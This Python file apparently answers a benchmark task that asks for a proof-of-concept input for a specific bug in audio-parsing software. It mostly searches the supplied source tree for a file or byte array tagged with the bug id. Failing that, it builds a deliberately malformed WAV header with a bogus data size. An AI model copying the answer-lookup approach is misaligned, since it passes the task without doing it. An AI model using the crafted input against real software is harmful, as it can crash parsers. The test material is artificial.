import os
import tarfile
import tempfile
import struct
import re
from pathlib import Path
from collections import defaultdict


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = self._prepare_root(src_path)
        bugid = "382816119"
        target_len = 58

        try:
            poc = self._find_poc(root_dir, bugid, target_len)
            if poc is not None and len(poc) > 0:
                return poc
        except Exception:
            pass

        return self._fallback_poc()

    def _prepare_root(self, src_path: str) -> Path:
        p = Path(src_path)
        if p.is_dir():
            return p

        tmpdir = Path(tempfile.mkdtemp(prefix="pocgen_"))
        try:
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                for member in tf.getmembers():
                    member_path = os.path.join(tmpdir, member.name)
                    if not is_within_directory(tmpdir, member_path):
                        continue
                    try:
                        tf.extract(member, path=tmpdir)
                    except Exception:
                        continue
        except tarfile.ReadError:
            # Not a tar; treat as directory (may already be extracted)
            return p
        return tmpdir

    def _collect_files_and_index(self, root_dir: Path):
        files = []
        files_by_basename = defaultdict(list)
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                path = Path(dirpath) / name
                files.append(path)
                files_by_basename[name.lower()].append(path)
        return files, files_by_basename

    def _find_poc(self, root_dir: Path, bugid: str, target_len: int) -> bytes:
        all_files, files_by_basename = self._collect_files_and_index(root_dir)

        data = self._find_poc_by_name(all_files, target_len, bugid)
        if data is not None:
            return data

        data = self._find_poc_from_source(all_files, bugid, target_len)
        if data is not None:
            return data

        data = self._fallback_search_generic(all_files, target_len)
        if data is not None:
            return data

        return None

    def _find_poc_by_name(self, all_files, target_len: int, bugid: str) -> bytes:
        bugid_lower = bugid.lower()
        candidates = []
        for p in all_files:
            s = str(p).lower()
            if bugid_lower in s:
                candidates.append(p)

        if not candidates:
            return None

        binary_exts = {
            ".wav", ".wave", ".aiff", ".aif", ".aifc", ".au", ".snd",
            ".avi", ".riff", ".rf64", ".w64", ".caf", ".wv",
            ".bin", ".dat", ".raw", ".pcm", ".img"
        }

        source_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".py", ".java", ".cs", ".m", ".mm", ".go", ".rs", ".php",
            ".rb", ".pl", ".m4", ".ac", ".am", ".cmake", ".in", ".sh",
            ".bat", ".ps1", ".yml", ".yaml", ".toml", ".ini", ".cfg",
            ".conf", ".pc", ".el", ".scm", ".lisp", ".clj", ".swift",
            ".kt", ".js", ".ts", ".json", ".xml", ".html", ".htm",
            ".md", ".rst", ".tex", ".inc"
        }

        best_path = None
        best_score = None

        for p in candidates:
            suffix = p.suffix.lower()
            if suffix in source_exts:
                continue
            try:
                size = p.stat().st_size
            except OSError:
                continue
            if size == 0:
                continue

            if suffix in binary_exts or suffix == "":
                base_score = 200
            else:
                base_score = 100

            score = base_score - abs(size - target_len)
            if best_path is None or score > best_score:
                best_path = p
                best_score = score

        if best_path is None:
            return None

        try:
            return best_path.read_bytes()
        except OSError:
            return None

    def _find_poc_from_source(self, all_files, bugid: str, target_len: int) -> bytes:
        text_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".txt", ".md", ".rst", ".inc", ".ipp", ".inl", ".java", ".py"
        }

        best_bytes = None
        best_score = None

        for p in all_files:
            if p.suffix.lower() not in text_exts:
                continue
            try:
                size = p.stat().st_size
            except OSError:
                continue
            if size > 2_000_000:
                continue
            try:
                data = p.read_bytes()
            except OSError:
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue

            if bugid not in text:
                continue

            arr_bytes = self._extract_byte_array_near_bugid(text, bugid)
            if arr_bytes:
                score = -abs(len(arr_bytes) - target_len)
                if best_bytes is None or score > best_score:
                    best_bytes = arr_bytes
                    best_score = score

        if best_bytes is not None:
            return bytes(best_bytes)
        return None

    def _extract_byte_array_near_bugid(self, text: str, bugid: str):
        idx = text.find(bugid)
        if idx == -1:
            return None

        start = text.find("{", idx)
        if start == -1:
            return None

        depth = 0
        i = start
        n = len(text)
        end = None
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i
                    break
            i += 1

        if end is None or end <= start:
            return None

        content = text[start + 1:end]
        content = re.sub(r"/\*.*?\*/", "", content, flags=re.S)
        content = re.sub(r"//.*", "", content)

        tokens = content.replace("\n", " ").replace("\r", " ").split(",")
        out = bytearray()

        for t in tokens:
            t = t.strip()
            if not t:
                continue

            if ")" in t and "(" in t:
                t = t.rsplit(")", 1)[-1].strip()
                if not t:
                    continue

            m = re.match(r"^[+-]?\s*(0[xX][0-9a-fA-F]+|\d+)", t)
            if m:
                num_str = m.group(0).replace(" ", "")
                try:
                    val = int(num_str, 0)
                except ValueError:
                    continue
            else:
                try:
                    val = int(t, 0)
                except ValueError:
                    continue

            if 0 <= val <= 255:
                out.append(val & 0xFF)

        if len(out) == 0:
            return None
        return bytes(out)

    def _fallback_search_generic(self, all_files, target_len: int) -> bytes:
        binary_exts = {
            ".wav", ".wave", ".aiff", ".aif", ".aifc", ".au", ".snd",
            ".avi", ".riff", ".rf64", ".w64", ".caf", ".wv",
            ".bin", ".dat", ".raw", ".pcm", ".img"
        }

        candidates = []
        for p in all_files:
            if p.suffix.lower() in binary_exts:
                try:
                    size = p.stat().st_size
                except OSError:
                    continue
                if size == 0:
                    continue
                candidates.append((p, size))

        if not candidates:
            return None

        best_path = None
        best_score = None
        for p, size in candidates:
            score = -abs(size - target_len)
            if best_path is None or score > best_score:
                best_path = p
                best_score = score

        if best_path is None:
            return None

        try:
            return best_path.read_bytes()
        except OSError:
            return None

    def _fallback_poc(self) -> bytes:
        riff_size = 50  # File size - 8
        fmt_chunk_size = 16
        audio_format = 1
        num_channels = 1
        sample_rate = 8000
        byte_rate = sample_rate * num_channels * 2  # 16-bit mono
        block_align = num_channels * 2
        bits_per_sample = 16
        data_size = 0xFFFFFFF0  # Deliberately inconsistent with actual file size

        header = bytearray()
        header += struct.pack("<4sI4s", b"RIFF", riff_size, b"WAVE")
        header += struct.pack("<4sI", b"fmt ", fmt_chunk_size)
        header += struct.pack(
            "<HHIIHH",
            audio_format,
            num_channels,
            sample_rate,
            byte_rate,
            block_align,
            bits_per_sample,
        )
        header += struct.pack("<4sI", b"data", data_size)

        if len(header) < 58:
            header += b"\x00" * (58 - len(header))
        else:
            header = header[:58]

        return bytes(header)
